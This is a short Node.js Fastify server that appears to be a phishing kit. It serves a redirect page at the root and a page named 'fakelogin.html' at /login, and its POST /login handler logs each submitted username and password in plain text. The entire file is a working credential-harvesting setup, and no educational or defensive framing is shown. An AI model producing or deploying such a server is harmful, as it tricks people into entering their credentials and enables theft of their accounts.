import fastify from 'fastify';
import fastifyFormbody from '@fastify/formbody';
import fastifyStatic from '@fastify/static';
import path from 'path';
import { fileURLToPath } from 'url';

const server = fastify();

server.register(fastifyFormbody);
server.register(fastifyStatic, {
    root: path.join(path.dirname(fileURLToPath(import.meta.url)), 'public'),
    prefix: '/public/'
});

server.get('/', (req, res) => {
    res.sendFile('redirect.html')
});

server.get('/login', (req, res) => {
    res.sendFile('fakelogin.html')
});

server.get('/style.css', (req, res) => {
    res.sendFile('style.css')
});

server.post('/login', (req, res) => {
    console.log(`User ${req.body.username} logged in with password ${req.body.password}`);
});


server.listen({ port: 3001 })